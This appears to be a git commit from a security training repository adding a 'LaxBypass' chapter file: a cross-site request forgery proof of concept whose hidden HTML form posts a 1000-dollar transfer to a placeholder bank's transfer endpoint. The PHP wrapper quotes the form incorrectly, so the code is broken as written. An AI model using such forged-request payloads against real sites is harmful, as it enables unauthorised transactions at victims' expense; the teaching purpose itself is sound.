c589b3a5330a238fceb5868c50ce3f663b25aa61
RedSecLabs <samaak@redseclabs.com>
2024-12-17 23:33:34 +0500

    Create Chapter-5

---
+++ Chapter-5/LaxBypass.php
@@ -0,0 +1,9 @@
+<?
+"<form action="www.vulnerablebank.com/transfer.php" method="POST">
+    <input type="hidden" name="to_account" value= "123456789" />
+    <input type="hidden" name="amount" value="1000" />
+    <input type="hidden" name="currency" value="usd" />
+    <input type="submit" value="Submit" />
+    </form>
+    "
+?>
